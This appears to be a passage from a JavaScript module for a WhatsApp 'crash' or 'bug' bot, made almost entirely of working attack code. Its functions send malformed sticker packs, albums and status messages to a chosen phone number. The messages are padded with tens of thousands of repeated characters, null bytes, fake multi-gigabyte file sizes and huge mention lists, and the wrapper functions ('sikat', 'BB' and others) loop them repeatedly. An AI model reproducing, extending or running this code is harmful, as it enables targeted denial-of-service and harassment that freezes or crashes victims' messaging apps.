jaDJEp3Zft9oAPy2+nIPl6OEK9iQ6ozmitbU2lSqKbR5uHIPs6jOPd84Dvkt2GheDJOt5r7R4TVLgiupPJs44NuHAZwKWsCm776qTog0Wkd6to/IrfZuY7YRWYAp6vOtRDgltrLAmM2JNan9VErbl6KFUzJoqKvI3ki8dhpAiM+5TggpVJchfQhtu4frNWD2krHNQSc3eW+Pevbbt2kEFBs1e7U7gDEuNXmLDQ0NmgghNRdluk4rqC/LJNac5Ur7e9SeSl4zyDD/rM4bU7+Z5kFbeb1eGVkUrH+nY5FeGeUJ+4ImEciwSWsHZqkMoW9GlJ9r9aSN0p1A3gBl8kL+oiMd46ou4VOASXsPYQp+hThXcy37wovuIq2FKLGjqhlawj9dXZvHAgTCc4w/VzeOfaSxyGPrK5rYiLgDbGn2eZ24dDpeNr0utAW9m0rv7e/6iXYJ0Nv91mL/nKZEItFa7xfI6PK/p00l+CXTWj2qPQiZLnf9Jcfao8MzUrewD+UkENToRtasylpcWTsVsmqOIDCMCvLdmFY0LEwPm0iomExYCE2YB2x4R39+qL44Ri+rALk7uY+DgZ/5iXk2OPDgay3f8/TZG3k/EzT/uL8GnULa7Ulq/5/22xFHcSriPdjC5QSlZH4m5JhZ56h2Jhcl31Ay2jpGmtS7MzQHOJTsjdmlddCFakSoVFC+BYoBTKDJnBRZ63Boz9QzMN2uIzssAW7UMyQNESf+GwJGEOxYGHIrkW2E9LMahVxn63yrYQZ+HjpQwQW35mmyZpt8FBsFhRfoKTkGJOvs7NbnopnSzcoqPO3OenRh35sUnoYJSS4coeFWuU0BvC08yNb9Xqsudl4pIygCjqD81HRAZbV0d83xecXtwzqLaIWJMJBRFWGQB7ZbgIg7XuXqdIaJ0tywKYP4VsQqrhiEvxM672pdPeh35hr36G40tpRNWPqGcUHTsEr2WPs556bk2GlA8BopBD0qHOVZQtcUkGZMPej4Yyi04Y3lY83S2rv8aspXyC7NfzKDucNaSganCGCwJtKmDHpD9uzXKoQw0GZ+35xDlYdIWFXdj5JSV8HdJoNTn4qk112u7OcCIQfHjBF/pHqzR5K7Zn+USUguHO8l4So9vC2ZPYHx+2U6AD/oCchts0BGce7jkffGFJ2gvXhLpHaQaI5g4+ePcv/70jHrXYK+iXrvgehjHG4uaRBS2v/awqaIVg+9QiCFEckRov2vMs5SGx2nDGSNXKriT/XvZ3vwoqg+TXJo2abD+cEF8irEsy9WBPHjW10UlCGjIwYdPgaH65oKjFw2oUdAJJblRMu/Q43+Jo9rEnfU8QC2P+bX3H3jLo38jfSENcg6163Pdi/jjQYTVBvBUD9KPt1W6gphU5QmtVbAMmKn8d/jFetY0hJ9+cbTN/gFCjCPiF6jvXmeVF9TwKZ4slV61aq6XvrmBnjUHgJ3TG7HsEO56JI/A6y8Grrqzr+MwQKRlCV9TuXftessf9ceKChJfdsLgGQYNC4KCu7Fc2ZNZDswE2H/sMp4LgRkgCks8GMCF/q5RZGKBRRtU3/Q0r5Me94B+l7T2bKzW8AyLmnyUx0+cSo2crPHvms+FbqxZvRNByTsypvSxhiRjMCoJQ0aYP9rbaEgHseksbNTdhdqYqRsL8hDUK890bjYWcV4f/Hlmfu5PP+H/xfF2i19w/5Oi0qm/loL7rwtMeKIt2VWX8+0Ftxqk3YQGnqSe85xgoL0jP/TLKQ8J3OiI57lWiZFRYeFgpnCWH2NkBmq3sU8im2aaSEGgyrM0tTbNrgah5V9Yjy4fIhT0zi2Ko4ynmgHxMqrY2tCKiTDjsp7crHk0cyHQc9NTTk7K9RQbFOvu+PJ/YAEfliG3AaiHzgAhuFUCkPPI+cVMP",
                    },
                },
            },
        };

        for (let i = 0; i < 2; i++) {
            const msg = generateWAMessageFromContent(targetNumber, message, {});

            let statusid;
            statusid = await sock.relayMessage("status@broadcast", msg.message, {
                messageId: generateRandomMessageId(),
                statusJidList: [targetNumber],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: targetNumber },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });

            await sock.relayMessage(
                targetNumber,
                {
                    message: {
                        protocolMessage: {
                            key: statusid.key,
                            limitSharing: {
                                sharingLimited: true,
                                trigger: "BIZ_SUPPORTS_FB_HOSTING",
                            },
                            type: "PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE",
                        },
                    },
                },
                {}
            );

            console.log(`${i} H3 Packet To ${targetNumber}`)
            await sleep(1000)
        }
    } catch (err) {
        console.log(err);
    }

}

async function F(sock, target) {
    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(30000),
            publisher: "© PhynxAgency",
            stickers: Array.from({ length: 999 }, () => ({
                fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                isAnimated: false,
                emojis: ["🩸", "🩸"],
                accessibilityLabel: "ꦽ".repeat(9999),
                stickerSentTs: " ",
                isAvatar: true,
                isLottie: false,
                isAiSticker: true,
                mimetype: "image/webp"
            })),
            fileLength: "536870912000",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "13135559098@s.whatsapp.net",
                participant: "0@s.whatsapp.net",
                stanzaId: "9999999999XXXXXX",
                forwardingScore: 9999,
                isForwarded: true,
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                mentionedJid: [
                    target, "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 30000 }, () =>
                        `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`
                    )
                ],
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: 0,
                        durationSecs: "999",
                        callType: "VIDEO",
                        participants: [
                            { jid: target, callOutcome: 1 },
                        ]
                    }
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: true,
                    id: "9741OURQ"
                },
            },
            packDescription: "ꦹ".repeat(99999),
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "723949",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});
}

// HIS FUNCTION
async function AB(target, mention) {
    const phynxImage = "https://files.catbox.moe/kst7w4.jpg";
    const Amount = 9999;
    const sizeAlbum = "536870912000";
    const mentionedSize = 31111;
    const mentionedCustom = [
        "phynxagency@s.whatsapp.net",
        "13135550001@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        "13135550003@s.whatsapp.net",
        "13135550004@s.whatsapp.net",
        "13135550005@s.whatsapp.net",
        "13135550006@s.whatsapp.net",
        "13135550007@s.whatsapp.net",
        "13135550008@s.whatsapp.net",
        "13135550009@s.whatsapp.net",
        "13135550010@s.whatsapp.net",
        "13135559999@s.whatsapp.net",
        "13135559098@s.whatsapp.net",
        "16502192547@s.whatsapp.net",
        "5521992999999@s.whatsapp.net"
    ];
    const mentionedTarget = [
        target
    ];
    const mentionedList = [
        ...mentionedTarget,
        ...mentionedCustom,
        ...Array.from({ length: mentionedSize }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    const textFlowCrashed = "ꦽ".repeat(Amount);
    const photo = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸"
            + "\n".repeat(3)
            + "ƈṙạṠђ.".repeat(20)
            + "phynx.agency/"
            + "ꦾ".repeat(50000)
            + "\n".repeat(3)
            + "ạ.io ".repeat(998),
        fileSha256: "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
        fileLength: sizeAlbum,
        height: 307,
        width: 734,
        mediaKey: "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
        fileEncSha256: "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
        directPath: "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1738686532",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
        scansSidecar: "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
        scanLengths: [2226, 6362, 4102, 6420
        ],
        midQualityFileSha256: "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
    };
    const album = await generateWAMessageFromContent(target, {
        albumMessage: {
            expectedImageCount: 999,
            expectedVideoCount: 666
        }
    }, {
        userJid: target,
        upload: sock.waUploadToServer
    });

    await sock.relayMessage(target, album.message, { messageId: album.key.id });

    for (let i = 0; i < 10; i++) {
        const msg = await generateWAMessage(target, photo, {
            upload: sock.waUploadToServer
        });
        const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

        msg.message[type].contextInfo = {
            mentionedJid: mentionedList,
            businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            fromMe: false,
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "ꦾ".repeat(100),
                newsletterJid: "120363330344810280@newsletter",
                serverMessageId: 1
            },
            externalAdReply: {
                title: "ꦾ".repeat(Amount),
                mediaType: 2,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                containsAutoReply: true,
                body: "© PhynxAgency",
                thumbnail: { url: phynxImage },
                sourceUrl: "about:blank",
                sourceId: sock.generateMessageTag(),
                ctwaClid: "ctwaClid",
                ref: "ref",
                clickToWhatsappCall: true,
                ctaPayload: "ctaPayload",
                disableNudge: false,
                originalimgLink: "about:blank"
            },
            quotedMessage: {
                callLogMesssage: {
                    isVideo: true,
                    callOutcome: 0,
                    durationSecs: "1",
                    callType: "VIDEO",
                    participants: [
                        { jid: target, callOutcome: 1 },
                    ]
                }
            },
            messageAssociation: {
                associationType: 1,
                parentMessageKey: album.key
            }
        };

        msg.message.nativeFlowMessage = {
            buttons: [
                {
                    type: "call_button",
                    callButton: {
                        displayText: textFlowCrashed,
                        phoneNumber: "+5521992999999"
                    }
                },
                {
                    type: "url",
                    urlButton: {
                        displayText: textFlowCrashed,
                        url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(55555))
                    }
                },
                {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        status: true,
                        criador: "PhynxAgency",
                        versao: "@latest",
                        atualizado: "2025-06-03",
                        suporte: "https://wa.me/5521992999999",
                        comandosDisponiveis: [`${command}`],
                        prefixo: `${prefix}`,
                        linguagem: "USA"
                    })
                        + "\u0000".repeat(Amount)
                }
            ],
            content: {
                namespace: "call_permission_request_namespace",
                name: "call_permission_request",
                params: [
                    {
                        name: "call_type",
                        value: "audio"
                    },
                    {
                        name: "permission_reason",
                        value: textFlowCrashed
                    },
                    {
                        name: "support_url",
                        value: "https://wa.me/+5521992999999"
                    }
                ]
            }
        };

        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });

        if (mention) {
            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            }, {
                additionalNodes: [
                    { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
                ]
            });
        }
    }
}

async function BB(sock, target) {
    for (let i = 0; i < 20; i++) {
        await AB(sock, target)
        await F(sock, target)
        B(sock, target)
        await B(sock, target)
    }
}
async function BB1(sock, target) {
    for (let i = 0; i < 20; i++) {
        await AB(sock, target)
        await F(sock, target)
        B1(sock, target)
        await B1(sock, target)
    }
}
async function BG2(sock, target) {
    for (let i = 0; i < 20; i++) {
        await AB(sock, target)
        await F(sock, target)
        G2(sock, target)
        await G2(sock, target)
    }
}
async function BH3(sock, target) {
    for (let i = 0; i < 20; i++) {
        await AB(sock, target)
        await F(sock, target)
        H3(sock, target)
        await H3(sock, target)
    }
}
async function sikat(sock, target) {
    for (let i = 0; i < 10; i++) {
        await AB(sock, target)
        await F(sock, target)
        B(sock, target)
        await B(sock, target)
        B1(sock, target)
        await B1(sock, target)
        G2(sock, target)
        await G2(sock, target)
        H3(sock, target)
        await H3(sock, target)
    }
}

module.exports = {
    A,
    B,
    B1,
    G2,
    H3,
    BB,
    BB1,
    BG2,
    BH3,
    sikat
}
